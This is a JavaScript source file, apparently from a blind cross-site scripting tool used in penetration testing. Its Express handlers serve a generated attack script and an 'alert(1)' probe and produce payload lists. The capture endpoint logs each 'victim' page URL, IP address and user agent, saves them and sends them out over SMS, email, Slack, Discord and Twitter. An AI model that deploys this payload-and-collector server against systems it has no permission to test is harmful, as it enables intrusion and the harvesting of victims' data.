// Copyright 2019 Lewis Ardern. All rights reserved.

const uuid = require('uuid/v1');

const sms = require('../utilities/services/sms');
const save = require('../utilities/save');
const config = require('../utilities/config')();
const template = require('../utilities/templates/script');
const payloads = require('../utilities/payloads');
const Domain = require('../utilities/domain');

const reporters = [
  require('../utilities/services/email'),
  require('../utilities/services/slack'),
  require('../utilities/services/discord'),
  require('../utilities/services/spark'),
  require('../utilities/services/twitter')
];


/* eslint-disable no-shadow */
function reportToUtilities(guid, domain, config) {
  reporters.forEach(svc => svc.send(guid, domain, config));
}

function sendSmsAndSaveToDisk(domain, res, guid) {
  if (!sms.lastSms()) {
    console.log(`Sending SMS And Saving To Disk For URL ${domain.url}`);
    sms.sendSMS(guid, domain, config, save);
  } else {
    console.log(`Already Sent SMS Today, Saving To Disk For URL ${domain.url}`);
  }
  save.saveCapuredResults(guid, domain, config);
  res.redirect(domain.url);
}

exports.displayScript = (req, res) => {
  res.type('.js');
  res.send(template.generateTemplate(config));
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  res.send(payloads.generatePayloads(config));
};

exports.capture = (req, res) => {
  let domain = {};
  const guid = uuid();
  if (req.body._) {
    domain = Domain.fromPayload(req.body._, config);
  } else {
    domain = new Domain(config);
    console.log(req.get('referer'));
    domain.url = req.get('referer') || null;
  }
  domain.victimIP =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress ||
    req.connection.socket.remoteAddress ||
    null;
  domain.userAgent = req.headers['user-agent'] || null;

  sendSmsAndSaveToDisk(domain, res, guid);

  reportToUtilities(guid, domain, config);
};
